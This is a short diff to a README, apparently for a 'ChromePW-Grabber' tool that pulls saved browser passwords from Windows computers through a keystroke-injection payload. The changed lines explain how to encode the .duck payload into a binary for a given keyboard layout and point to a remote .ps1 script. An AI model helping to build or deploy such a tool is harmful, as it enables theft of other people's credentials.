@@ -29,9 +29,12 @@ This is a simple script which can extract browser passwords from Windows Compute
 (ChromePW-Grabber.duck)
 - Place your repository url .ps1 from cloud
 
-(Inside root folder project run inside powershell)
+(Copy .duck Inside root folder project and run inside powershell)
 ```bash
-  java -jar encoder/encoder.jar -i ChromePWGrabberPayload.duck -o ChromePWGrabberPayload.bin -l .\encoder\resources\us.properties
+  cd (your project folder)
+```
+```bash
+  java -jar encoder/encoder.jar -i ChromePWGrabberPayload.duck -o ChromePWGrabberPayload.bin -l .\encoder\resources\(keyboard setup) eg: us.properties
 ```
 
 ```bash
